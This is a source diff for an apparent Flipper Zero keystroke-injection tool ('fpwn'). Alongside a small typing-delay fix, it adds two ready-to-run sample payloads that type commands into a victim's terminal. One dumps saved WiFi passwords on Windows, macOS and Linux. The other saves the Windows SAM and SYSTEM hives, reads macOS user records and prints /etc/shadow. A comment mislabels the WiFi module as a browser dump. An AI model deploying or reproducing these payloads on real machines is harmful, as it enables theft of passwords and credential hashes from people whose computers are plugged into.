@@ -282,9 +282,11 @@ static void fpwn_type_char(char c) {
 
     if(need_shift) {
         furi_hal_hid_kb_press(KEY_MOD_LEFT_SHIFT | keycode);
+        furi_delay_ms(2);
         furi_hal_hid_kb_release(KEY_MOD_LEFT_SHIFT | keycode);
     } else {
         furi_hal_hid_kb_press(keycode);
+        furi_delay_ms(2);
         furi_hal_hid_kb_release(keycode);
     }
     /* Small inter-key delay to avoid dropped keystrokes */
@@ -1252,6 +1254,67 @@ static const char SAMPLE_ATTACK_CHAIN[] =
     "DELAY 1500\n"
     "CTRL ALT l\n";
 
+/* Browser Credential Dump — extracts saved WiFi passwords */
+static const char SAMPLE_WIFI_CREDS[] =
+    "NAME WiFi Credential Dump\n"
+    "DESCRIPTION Extracts saved WiFi passwords from the system\n"
+    "CATEGORY credential\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "GUI r\n"
+    "DELAY 800\n"
+    "STRING powershell -nop -ep bypass\n"
+    "ENTER\n"
+    "DELAY 1200\n"
+    "STRING (netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$n=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$n\" key=clear)} | Select-String 'Key Content\\W+\\:(.+)$' | %{\"WIFI: $n = \" + $_.Matches.Groups[1].Value.Trim()}\n"
+    "ENTER\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING Terminal\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "STRING for ssid in $(networksetup -listpreferredwirelessnetworks en0 | tail -n +2 | tr -d ' '); do pw=$(security find-generic-password -wa \"$ssid\" 2>/dev/null); echo \"WIFI: $ssid = $pw\"; done\n"
+    "ENTER\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "STRING sudo grep -rH psk= /etc/NetworkManager/system-connections/ 2>/dev/null || nmcli -s -g 802-11-wireless.ssid,802-11-wireless-security.psk connection show 2>/dev/null | sed 's/:/: /' \n"
+    "ENTER\n";
+
+/* SAM/Shadow Dump — extracts password hashes */
+static const char SAMPLE_HASH_DUMP[] =
+    "NAME Hash Dump\n"
+    "DESCRIPTION Extracts OS password hashes (requires admin/root)\n"
+    "CATEGORY credential\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "GUI r\n"
+    "DELAY 800\n"
+    "STRING powershell -nop -ep bypass Start-Process powershell -Verb RunAs -ArgumentList '-nop -ep bypass -c \"reg save HKLM\\SAM $env:TEMP\\s.hiv /y; reg save HKLM\\SYSTEM $env:TEMP\\y.hiv /y; Write-Host SAM+SYSTEM saved to $env:TEMP\"'\n"
+    "ENTER\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING Terminal\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "STRING sudo dscl . -readall /Users UniqueID RealName AuthenticationAuthority 2>/dev/null | head -60\n"
+    "ENTER\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "STRING sudo cat /etc/shadow 2>/dev/null | head -20\n"
+    "ENTER\n";
+
 static bool fpwn_write_sample_file(Storage* storage, const char* path, const char* content) {
     File* f = storage_file_alloc(storage);
     if(!storage_file_open(f, path, FSAM_WRITE, FSOM_CREATE_NEW)) {
@@ -1280,4 +1343,10 @@ void fpwn_modules_write_samples(FPwnApp* app) {
 
     snprintf(path, sizeof(path), "%s/attack_chain.fpwn", FPWN_MODULES_DIR);
     fpwn_write_sample_file(app->storage, path, SAMPLE_ATTACK_CHAIN);
+
+    snprintf(path, sizeof(path), "%s/wifi_creds.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_WIFI_CREDS);
+
+    snprintf(path, sizeof(path), "%s/hash_dump.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_HASH_DUMP);
 }
